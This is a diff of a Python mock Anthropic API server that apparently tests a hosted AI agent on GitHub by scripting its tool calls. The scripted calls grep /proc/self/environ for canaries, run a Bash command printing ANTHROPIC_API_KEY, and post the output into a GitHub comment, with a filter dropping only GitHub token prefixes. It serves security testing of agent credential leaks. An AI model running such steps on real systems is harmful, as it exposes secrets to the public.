@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-"""Scripted Anthropic stand-in for the $0 hosted canary.
+"""Hosted control: Grep /proc/self identity + environ canary, then Bash scrub.
 
-Posts ONLY lines that contain CANARY- and do not look like live GitHub tokens.
-Holds ~90s after the comment tool so an unauthenticated GET can observe PATCH 1.
+Comment body is filtered: comm/status text plus CANARY-* lines only.
+Live ghp_/ghs_/github_pat_ values are dropped.
 """
 from __future__ import annotations
 
@@ -13,8 +13,6 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 PORT = int(os.environ.get("FAKE_ANTHROPIC_PORT", "8899"))
 HOLD_SECONDS = int(os.environ.get("FAKE_ANTHROPIC_HOLD", "90"))
-STATE = {"n_finish": 0}
-
 BAD = ("ghp_", "ghs_", "gho_", "ghu_", "github_pat_")
 
 
@@ -107,14 +105,21 @@ def stream(blocks: list, stop: str) -> bytes:
     return "".join(out).encode()
 
 
-def canary_only(blob: str) -> str:
-    lines = []
-    for line in blob.replace("\x00", "\n").splitlines():
-        if "CANARY-" not in line:
-            continue
+def scrub(blob: str) -> str:
+    blob = blob.replace("\x00", "\n")
+    keep = []
+    for line in blob.splitlines():
         if any(b in line for b in BAD):
             continue
-        lines.append(line)
+        keep.append(line)
+    return "\n".join(keep)
+
+
+def canary_lines(blob: str) -> str:
+    lines = []
+    for line in scrub(blob).splitlines():
+        if "CANARY-" in line:
+            lines.append(line)
     return "\n".join(lines) if lines else "NO_CANARY_MATCH"
 
 
@@ -128,6 +133,40 @@ def tool_results(req: dict) -> list:
                     cc = b.get("content")
                     out.append(cc if isinstance(cc, str) else json.dumps(cc))
     return out
+
+
+STEPS = [
+    {
+        "name": "Grep",
+        "input": {
+            "pattern": ".",
+            "path": "/proc/self/comm",
+            "output_mode": "content",
+        },
+    },
+    {
+        "name": "Grep",
+        "input": {
+            "pattern": "^Name:",
+            "path": "/proc/self/status",
+            "output_mode": "content",
+        },
+    },
+    {
+        "name": "Grep",
+        "input": {
+            "pattern": "CANARY",
+            "path": "/proc/self/environ",
+            "output_mode": "content",
+        },
+    },
+    {
+        "name": "Bash",
+        "input": {
+            "command": 'printf KEY=%s\\n "${ANTHROPIC_API_KEY:-EMPTY}"'
+        },
+    },
+]
 
 
 class H(BaseHTTPRequestHandler):
@@ -153,31 +192,26 @@ class H(BaseHTTPRequestHandler):
             return
         results = tool_results(req)
         step = len(results)
-        if step == 0:
-            blocks = [
-                {
-                    "type": "tool_use",
-                    "name": "Grep",
-                    "input": {
-                        "pattern": "CANARY",
-                        "path": "/proc/self/environ",
-                        "output_mode": "content",
-                    },
-                }
-            ]
+        if step < len(STEPS):
+            blocks = [{"type": "tool_use", **STEPS[step]}]
             stop = "tool_use"
-        elif STATE["n_finish"] == 0:
-            STATE["n_finish"] = 1
-            filtered = canary_only(results[0])
+        elif step == len(STEPS):
+            comm = scrub(results[0])[:200]
+            status = scrub(results[1])[:200]
+            env = canary_lines(results[2])
+            bash = scrub(results[3])[:200]
+            body = (
+                "hosted-control (canary-only; no live tokens):\n\n"
+                f"Grep /proc/self/comm:\n```\n{comm}\n```\n\n"
+                f"Grep /proc/self/status Name:\n```\n{status}\n```\n\n"
+                f"Grep /proc/self/environ CANARY:\n```\n{env}\n```\n\n"
+                f"Bash printf KEY=$ANTHROPIC_API_KEY:\n```\n{bash}\n```\n"
+            )
             blocks = [
                 {
                     "type": "tool_use",
                     "name": "mcp__github_comment__update_claude_comment",
-                    "input": {
-                        "body": "lab-canary-only (no live tokens):\n\n```\n"
-                        + filtered[:4000]
-                        + "\n```"
-                    },
+                    "input": {"body": body[:8000]},
                 }
             ]
             stop = "tool_use"
